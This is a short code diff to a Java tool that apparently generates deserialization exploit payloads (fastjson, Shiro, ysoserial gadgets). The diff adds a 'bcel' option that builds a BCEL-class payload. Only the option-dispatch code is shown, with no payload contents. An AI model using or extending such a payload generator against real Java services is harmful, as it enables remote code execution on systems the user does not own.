@@ -3,6 +3,7 @@ package com.ding0x0.run;
 import com.ding0x0.AbsGenerate;
 import com.ding0x0.Payload;
 import com.ding0x0.fastjson.GenerateFastjsonPayload;
+import com.ding0x0.other.GenerateBCELPayload;
 import com.ding0x0.other.GenerateShiroPayload;
 import com.ding0x0.yso.GenerateYsoPayload;
 import org.apache.commons.cli.CommandLine;
@@ -62,6 +63,9 @@ public class Process {
                 String gadget = this.cmdline.getOptionValue("g");
                 generate = new GenerateShiroPayload(gadget, key, cmd, dirty);
                 break;
+            case "bcel":
+                String lf = this.cmdline.getOptionValue("lf");
+                generate = new GenerateBCELPayload(lf);
         }
 
         return generate.generatePayload();
